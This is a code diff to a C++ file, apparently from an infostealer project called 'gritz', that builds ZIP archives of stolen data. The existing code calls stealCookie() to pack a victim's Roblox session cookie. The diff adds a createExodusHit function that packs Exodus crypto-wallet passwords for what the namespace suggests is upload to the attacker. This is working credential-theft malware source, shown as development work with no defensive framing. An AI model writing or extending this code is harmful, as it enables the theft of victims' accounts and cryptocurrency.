@@ -1,6 +1,6 @@
 #include "ZipFile.h"
 
-std::vector<uint8_t> gritz::upload::zip::ZipFile::create(std::string tokenString)
+std::vector<byte> gritz::upload::zip::ZipFile::create(std::string tokenString)
 {
 	mz_zip_archive archive{};
 
@@ -11,6 +11,34 @@ std::vector<uint8_t> gritz::upload::zip::ZipFile::create(std::string tokenString
 
 	addEntry(archive, "yo wsp G", "example/message.txt");
 	addEntry(archive, gritz::features::roblox::cRobloxCookie::stealCookie(), "roblox/cookie.txt");
+
+	std::vector<byte> result;
+
+	void* heapData = nullptr;
+	size_t heapSz = 0;
+
+	if (mz_zip_writer_finalize_heap_archive(&archive, &heapData, &heapSz))
+	{
+		byte* bytes = static_cast<byte*>(heapData);
+
+		result.assign(bytes, bytes + heapSz);
+	}
+
+	mz_zip_writer_end(&archive);
+
+	return result;
+}
+
+std::vector<byte> gritz::upload::zip::ZipFile::createExodusHit(std::string passwords)
+{
+	mz_zip_archive archive{};
+
+	if (!mz_zip_writer_init_heap(&archive, 0, 0))
+	{
+		return {};
+	}
+
+	addEntry(archive, passwords, "exodus/passwords.txt");
 
 	std::vector<uint8_t> result;
 
